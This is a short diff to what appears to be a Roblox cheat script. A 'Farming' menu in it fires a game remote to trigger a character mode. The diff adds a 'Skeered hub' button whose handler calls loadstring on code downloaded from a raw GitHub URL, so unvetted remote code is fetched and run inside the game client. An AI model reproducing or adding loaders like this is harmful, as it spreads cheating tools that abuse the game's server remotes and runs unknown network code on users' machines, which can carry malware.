@@ -425,6 +425,10 @@ end)
 Farming:AddButton("Ren Mode - Ren/Human Only",function()
     game:GetService("ReplicatedStorage").Remotes.heart_ablaze_mode_remote:FireServer(true)
 end)
+
+Farming:AddButton("Skeered hub",function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Skeereddo/name/main/krnl', true))()
+end)
 --Settings
 
 getgenv().Method = "Sword"
